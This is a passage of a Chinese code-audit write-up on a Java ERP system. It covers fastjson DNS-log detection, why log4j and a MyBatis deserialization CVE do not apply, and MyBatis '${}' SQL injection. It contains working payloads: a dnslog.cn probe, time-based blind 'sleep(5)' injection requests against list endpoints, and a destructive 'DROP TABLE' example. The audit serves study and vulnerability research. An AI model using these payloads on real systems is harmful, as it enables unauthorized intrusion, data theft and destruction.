<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet4Address&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;xxx.dnslog.cn&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p>@type：指定 fastjson 要实例化的类， val：这个类的某个字段值  </p>
<p><code>Inet4Address</code> 只能解析 IP&#x2F;域名，不能触发 LDAP 请求  </p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">user/list?search=%7B%22%40type%22%3A%22java.net.Inet4Address%22%2C%22val%22%3A%22ccne35.dnslog.cn%22%7D</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.28.192.1:8123<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351506.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="断点调试："><a href="#断点调试：" class="headerlink" title="断点调试："></a>断点调试：</h4><p>调试过程基本和“分析链”中一致，</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351332.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351023.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351524.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351288.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352184.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352076.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352144.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352547.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352250.png" srcset="/img/loading.gif" lazyload></p>
<p><font style="color:rgb(34, 34, 38);"></font></p>
<blockquote>
<p><font style="color:rgb(34, 34, 38);">通过dnslog探测fastjson的几种方法（</font>java.net.Inet4Address、Inet6Address、InetSocketAddress，url）</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Adminxe/article/details/105918000">https://blog.csdn.net/Adminxe/article/details/105918000</a></p>
</blockquote>
<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java">HTTP GET 请求 ：/user/list?search=&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;xxx.dnslog.cn&quot;</span>&#125;<br>-&gt;	ResourceController.java<br><span class="hljs-title function_">getList</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;apiName&quot;)</span> String apiName,</span><br><span class="hljs-params">                        <span class="hljs-meta">@RequestParam(value = Constants.PAGE_SIZE, required = false)</span> Integer pageSize,</span><br><span class="hljs-params">                        <span class="hljs-meta">@RequestParam(value = Constants.CURRENT_PAGE, required = false)</span> Integer currentPage,</span><br><span class="hljs-params">                        <span class="hljs-meta">@RequestParam(value = Constants.SEARCH, required = false)</span> String search,</span><br><span class="hljs-params">                        HttpServletRequest request)</span><br>-&gt;	UserComponent.java<br>getUserList#getInfo(search)<br>-&gt;<br>JSONObject.parseObject(search)<br>-&gt;<br>DefaultJSONParser<br>-&gt;<br>parse <br>-&gt;<br>checkAutoType<br>-&gt;<br>loadClass<br>-&gt;<br>TypeUtils.loadClass<br>-&gt;<br>config.getDeserializers().get(clazz)<br>-&gt;<br>Inet4Address<br>-&gt;<br>MiscCodec#ObjectDeserializer<br>-&gt;<br><span class="hljs-keyword">return</span> InetAddress.getByName(strVal); <span class="hljs-comment">//将strVal作为主机名,获取其对应的ip，域名在此处被解析</span><br></code></pre></td></tr></table></figure>



<h3 id="2-2-log4j-（不存在）"><a href="#2-2-log4j-（不存在）" class="headerlink" title="2.2 log4j （不存在）"></a>2.2 log4j （不存在）</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353028.png" srcset="/img/loading.gif" lazyload></p>
<p>并没有导入 log4j-core 包，单独的 log4j-to-slf4j  是不存在漏洞的</p>
<p><code>log4j-to-slf4j</code> 是一个 <strong>桥接器（bridge）</strong>，它把 Log4j 2 API 的调用转发到 SLF4J，由 SLF4J 来真正打印  </p>
<h3 id="2-3-MyBatis-CVE-2020-26945（不存在）"><a href="#2-3-MyBatis-CVE-2020-26945（不存在）" class="headerlink" title="2.3 MyBatis CVE-2020-26945（不存在）"></a>2.3 MyBatis <strong><font style="color:rgba(0, 0, 0, 0.85);">CVE-2020-26945（不存在）</font></strong></h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353100.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="漏洞点分析："><a href="#漏洞点分析：" class="headerlink" title="漏洞点分析："></a>漏洞点分析：</h4><p><font style="color:rgb(51, 51, 51);">SerializedCache#deserialize()</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">//从底层的 delegate（被代理的对象，一般是一个缓存或Map）中取值</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> delegate.getObject(key);<br>    <span class="hljs-comment">// 如果取到的值是 null(过期)，直接返回 null；</span><br>    <span class="hljs-comment">// 否则将取到的值强转为 byte[]，再调用 deserialize 方法反序列化，恢复成原来的对象</span><br>    <span class="hljs-comment">//deserialize((byte[]) object) 就是 RCE 的触发点了</span><br>    <span class="hljs-keyword">return</span> object == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> : deserialize((<span class="hljs-type">byte</span>[]) object);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>跟进 delegate.getObject</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Cache</span> &#123;<br>    ...<br>    Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(Object key)</span>;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure>

<p>getObject    ctrl+alt+左键 转到声明</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353445.png" srcset="/img/loading.gif" lazyload></p>
<p> 跟进到 ScheduledCache  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">//clearWhenStale() 检查缓存是否“过期”</span><br>    <span class="hljs-keyword">return</span> clearWhenStale() ? <span class="hljs-literal">null</span> : delegate.getObject(key);<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">clearWhenStale</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (System.currentTimeMillis() - lastClear &gt; clearInterval) &#123;<br>        clear();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a><font style="color:rgb(34, 34, 34);">利用条件</font></h4><ol>
<li><font style="color:rgb(53, 53, 53);">用户启用了二级缓存功能</font></li>
</ol>
<blockquote>
<p><font style="color:rgb(53, 53, 53);">二级缓存其实就是将查询的结果，放入缓存中，下次查询相同的条件时，直接从缓存中获取结果，降低sql服务器的压力</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353146.png" srcset="/img/loading.gif" lazyload></p>
</blockquote>
<ol start="2">
<li><font style="color:rgb(53, 53, 53);">攻击者可以修改缓存的内容，替换为恶意反序列化数据</font></li>
<li><font style="color:rgb(53, 53, 53);">用户未设置JEP-290过滤，且没有任何防御反序列化攻击的措施</font></li>
</ol>
<blockquote>
<p><strong>JEP-290 是从 Java 9 开始引入的</strong>，在 Java 8 里 <strong>不存在全局或类级序列化过滤器</strong> 的机制  </p>
</blockquote>
<p><strong>由于找不到可修改的缓存内容，这部分就作为漏洞学习一遍，本系统不存在此漏洞</strong></p>
<h2 id="接下来的审计按照以下方向进行："><a href="#接下来的审计按照以下方向进行：" class="headerlink" title="接下来的审计按照以下方向进行："></a>接下来的审计按照以下方向进行：</h2><ol>
<li>SQL 注入</li>
<li><del>文件安全 （在翻找功能点过程中并没有发现有能上传&amp;读取文件的点）</del></li>
<li>身份验证&amp;鉴权 （LogCostFilter.java）</li>
<li>第三方组件&amp;依赖 （已分析）</li>
</ol>
<h2 id="3、Mybatis-SQL-注入"><a href="#3、Mybatis-SQL-注入" class="headerlink" title="3、Mybatis SQL 注入"></a>3、Mybatis SQL 注入</h2><p>Mybatis框架的sql注入关注<code>${}</code>：</p>
<p><code>${}</code>用于直接替换SQL语句中的占位符，而<code>#{}</code>用于预编译</p>
<ol>
<li>like模糊查询</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">xml模板：<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%$&#123;name&#125;%&#x27;</span><br><br><span class="hljs-keyword">sql</span>注入：<br><span class="hljs-string">&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><br>执行<span class="hljs-keyword">sql</span>:<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%%&#x27;</span> <span class="hljs-keyword">OR</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;1%&#x27;</span><br></code></pre></td></tr></table></figure>

<ol start="2">
<li>动态列名 &#x2F; 表名</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">xml模板：<br><span class="hljs-keyword">SELECT</span> $&#123;<span class="hljs-keyword">column</span>&#125; <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> #&#123;id&#125;<br><br><span class="hljs-keyword">sql</span>注入：<br><span class="hljs-keyword">column</span> <span class="hljs-operator">=</span> &quot;username, password from users --&quot;<br><br>执行<span class="hljs-keyword">sql</span>:<br><span class="hljs-keyword">SELECT</span> username, password <span class="hljs-keyword">from</span> users <span class="hljs-comment">-- FROM users WHERE id = ?</span><br></code></pre></td></tr></table></figure>

<ol start="3">
<li>Order By</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">xml模板：<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> $&#123;sortColumn&#125;<br><br><span class="hljs-keyword">sql</span>注入：<br>sortColumn <span class="hljs-operator">=</span> &quot;id; DROP TABLE users --&quot;<br><br>执行<span class="hljs-keyword">sql</span>:<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> id; <span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> users <span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure>

<ol start="4">
<li>IN</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">xml模板：<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-keyword">IN</span> ($&#123;ids&#125;)<br><br><span class="hljs-keyword">sql</span>注入：<br>mapper.findByIds(&quot;1,2,3 OR 1=1&quot;);<br><br>执行<span class="hljs-keyword">sql</span>:<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-keyword">IN</span> (<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">OR</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>



<h3 id="AccoutMapperEx-xml"><a href="#AccoutMapperEx-xml" class="headerlink" title="AccoutMapperEx.xml"></a>AccoutMapperEx.xml</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353446.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354889.png" srcset="/img/loading.gif" lazyload></p>
<p>接下来考虑Controller&#x2F;Service 中是否传入了 name 参数</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354762.png" srcset="/img/loading.gif" lazyload></p>
<p>跟进 <font style="color:#080808;background-color:#ffffff;">select，</font></p>
<p><font style="color:#080808;background-color:#ffffff;"> 从请求参数 map 中解析搜索条件  </font></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354110.png" srcset="/img/loading.gif" lazyload></p>
<p>寻找调用 <font style="color:#080808;background-color:#ffffff;">getAccountList() 的位置</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354842.png" srcset="/img/loading.gif" lazyload></p>
<p>跟进 select</p>
<p> <font style="color:#080808;background-color:#ffffff;">select(String apiName, Map&lt;String, String&gt; parameterMap) 是</font>整个查询模块的统一入口  </p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354949.png" srcset="/img/loading.gif" lazyload></p>
<p>继续跟进，</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354239.png" srcset="/img/loading.gif" lazyload></p>
<p>接下来去找对应的功能点，可以发现，在“基本资料”中都是查询接口，而现在我们需要的是“结算账户”的查询接口，其他的接口也应该存在sql注入，之后查看。</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354668.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355700.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355478.png" srcset="/img/loading.gif" lazyload></p>
<p>对“结算账户”的查询点抓包后，正好对应刚才源码中看到的几个参数“<font style="color:#080808;background-color:#ffffff;">name, serialNo, remark</font>”：</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355029.png" srcset="/img/loading.gif" lazyload></p>
<p>对 name 参数进行sql注入：</p>
<p>从结果来看时间盲注成功了</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html">GET /account/list?search=%7B%22name%22%3A%221%22%2C%22serialNo%22%3A%222%22%2C%22remark%22%3A%223%22%7D&amp;currentPage=1&amp;pageSize=15 HTTP/1.1<br>Host: 169.254.252.28:8123<br>Accept: application/json, text/javascript, */*; q=0.01<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br>X-Requested-With: XMLHttpRequest<br>Referer: http://169.254.252.28:8123/pages/manage/account.html<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Cookie: JSESSIONID=A4E545CEF643F8473838EB799DB320AD; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1755655005; HMACCOUNT=A245E83F95E74014; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1755656817<br>Connection: close<br><br>GET /account/list?search=&#123;&quot;name&quot;:&quot;123&#x27; or sleep(5)--+&quot;,&quot;serialNo&quot;:&quot;2&quot;,&quot;remark&quot;:&quot;3&quot;&#125;&amp;currentPage=1&amp;pageSize=15 HTTP/1.1<br><br>payload：<br>GET /account/list?search=%7B%22name%22%3A%22123%27%20or%20sleep(5)--%2B%22%2C%22serialNo%22%3A%222%22%2C%22remark%22%3A%223%22%7D&amp;currentPage=1&amp;pageSize=15 HTTP/1.1<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355391.png" srcset="/img/loading.gif" lazyload></p>
<p>在Mybatis的日志中， 可以清楚看到 SQL 注入点已经被利用，并且 <strong>时间盲注生效</strong>：</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201356858.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="DepotMapperEx-xml"><a href="#DepotMapperEx-xml" class="headerlink" title="DepotMapperEx.xml"></a>DepotMapperEx.xml</h3><p>通过上述AccoutMapperEx.xml的审计，可以确定该系统中有多个类似的sql注入点，他们的流程都是一致的。</p>
<p>再以DepotMapperEx.xml 为例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;select id=&quot;selectByConditionDepot&quot; parameterType=&quot;com.jsh.erp.datasource.entities.DepotExample&quot; resultMap=&quot;ResultMapEx&quot;&gt;<br>  select dep.*,usr.username as principalName<br>  FROM jsh_depot dep<br>  left join jsh_user usr on usr.id=dep.principal and ifnull(usr.status,&#x27;0&#x27;) not in(&#x27;1&#x27;,&#x27;2&#x27;)<br>  where 1=1<br>  &lt;if test=&quot;name != null&quot;&gt;<br>    and dep.name like &#x27;%$&#123;name&#125;%&#x27;<br>  &lt;/if&gt;<br><br>-&gt;selectByConditionDepot<br>public interface DepotMapperEx &#123;<br><br>    List&lt;DepotEx&gt; selectByConditionDepot(<br>            @Param(&quot;name&quot;) String name,<br>            @Param(&quot;type&quot;) Integer type,<br>            @Param(&quot;remark&quot;) String remark,<br>            @Param(&quot;offset&quot;) Integer offset,<br>            @Param(&quot;rows&quot;) Integer rows);<br><br>-&gt;DepotService<br>public List&lt;DepotEx&gt; select(String name, Integer type, String remark, int offset, int rows)throws Exception &#123;<br>        List&lt;DepotEx&gt; list=null;<br>        try&#123;<br>            list=depotMapperEx.selectByConditionDepot(name, type, remark, offset, rows);<br>        &#125;catch(Exception e)&#123;<br>            JshException.readFail(logger, e);<br>        &#125;<br>        return list;<br>    &#125;<br><br>-&gt;select<br>@Override<br>    public List&lt;?&gt; select(Map&lt;String, String&gt; map)throws Exception &#123;<br>        return getDepotList(map);<br>    &#125;<br><br>    private List&lt;?&gt; getDepotList(Map&lt;String, String&gt; map)throws Exception &#123;<br>        String search = map.get(Constants.SEARCH);<br>        String name = StringUtil.getInfo(search, &quot;name&quot;);<br>        Integer type = StringUtil.parseInteger(StringUtil.getInfo(search, &quot;type&quot;));<br>        String remark = StringUtil.getInfo(search, &quot;remark&quot;);<br>        String order = QueryUtils.order(map);<br>        return depotService.select(name, type, remark, QueryUtils.offset(map), QueryUtils.rows(map));<br>    &#125;<br><br>-&gt;select<br> /**<br>     * 查询<br>     * @param apiName<br>     * @param parameterMap<br>     * @return<br>     */<br>    public List&lt;?&gt; select(String apiName, Map&lt;String, String&gt; parameterMap)throws Exception &#123;<br>        if (StringUtil.isNotEmpty(apiName)) &#123;<br>            return container.getCommonQuery(apiName).select(parameterMap);<br>        &#125;<br>        return new ArrayList&lt;Object&gt;();<br>    &#125;<br><br>-&gt;select<br>@GetMapping(value = &quot;/&#123;apiName&#125;/list&quot;)<br>    public String getList(@PathVariable(&quot;apiName&quot;) String apiName,<br>                        @RequestParam(value = Constants.PAGE_SIZE, required = false) Integer pageSize,<br>                        @RequestParam(value = Constants.CURRENT_PAGE, required = false) Integer currentPage,<br>                        @RequestParam(value = Constants.SEARCH, required = false) String search,<br>                        HttpServletRequest request)throws Exception &#123;<br>        Map&lt;String, String&gt; parameterMap = ParamUtils.requestToMap(request);<br>        parameterMap.put(Constants.SEARCH, search);<br>        PageQueryInfo queryInfo = new PageQueryInfo();<br>        Map&lt;String, Object&gt; objectMap = new HashMap&lt;String, Object&gt;();<br>        if (pageSize != null &amp;&amp; pageSize &lt;= 0) &#123;<br>            pageSize = 10;<br>        &#125;<br>        String offset = ParamUtils.getPageOffset(currentPage, pageSize);<br>        if (StringUtil.isNotEmpty(offset)) &#123;<br>            parameterMap.put(Constants.OFFSET, offset);<br>        &#125;<br>        List&lt;?&gt; list = configResourceManager.select(apiName, parameterMap);<br>        objectMap.put(&quot;page&quot;, queryInfo);<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357198.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357796.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/52403351/1755660382217-6998767d-c701-40dc-b102-1ac471e6c34e.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><p>通过全局搜索到<code>like &#39;%${name}%&#39;</code>，定位 <code>&lt;select id=&quot;selectByConditionXxxxx&quot;</code>，之后便在 <code>controller</code> 和 <code>service</code> 中找对应的文件名，在其中找到  <code>selectByConditionXxxxx</code> (基本上都在service中)，找到之后会发现 <code>selectByConditionXxxxx</code> 中所需的几个参数，都是来自 <code>select</code> 查询，跟进 <code>select</code> ，找到 <code>getXxxList</code> 方法解析 <code>select(Map&lt;String,String&gt; map)</code> 传入的前端请求参数，跟进 <code>select</code>，发现他是统一接口，通过 <code>apiName</code> 动态调用不同查询。接下来就在前端找对应的功能点，在”基本资料“里可以看到有查询功能，通过抓包或者对应名称来确定需要的接口，例如：<code>GET /account/list?search={&quot;name&quot;:&quot;1&quot;,&quot;serialNo&quot;:&quot;2&quot;,&quot;remark&quot;:&quot;3&quot;}&amp;currentPage=1&amp;pageSize=15 HTTP/1.1</code>，<code>name、serialNo、remark</code> 都是对应的 <code>AccoutMapperEx</code> 的参数，那么就在 <code>name</code> 参数注入。</p>
<p>同样的漏洞有：</p>
<ul>
<li>AccoutMapperEx.xml	</li>
<li>DepotMapperEx.xml </li>
<li>LogMapperEx.xml （功能点在“系统管理”-“日志管理”）<ul>
<li>payload : 111’ OR SLEEP(5) OR ‘1’&#x3D;’1</li>
</ul>
</li>
<li><font style="color:#080808;background-color:#ffffff;">MaterialMapperEx.xml	（功能点在“商品管理”-“商品信息”）</font></li>
